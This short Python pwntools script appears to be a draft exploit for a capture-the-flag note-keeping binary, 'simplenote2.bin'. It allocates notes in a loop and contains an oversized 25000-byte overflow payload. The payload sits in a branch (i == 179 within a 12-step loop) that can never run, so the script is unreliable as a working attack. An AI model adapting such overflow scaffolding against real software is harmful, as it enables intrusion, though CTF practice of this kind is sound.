#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *

context.log_level = "debug"
p = process("./subler ./simplenote2.bin ./flag", shell=True)

p.recvuntil("> ")

#now loop to hell!

for i in range(12):

    p.sendline("1")
    p.recvuntil("> ")
    p.sendline("20000")
    p.recvuntil("content:\n")
    if i == 179:
        p.sendline("a" * 25000 + "say2say2")
    else:
        p.sendline("say"+str(i))
    p.recvuntil("> ")


p.interactive()
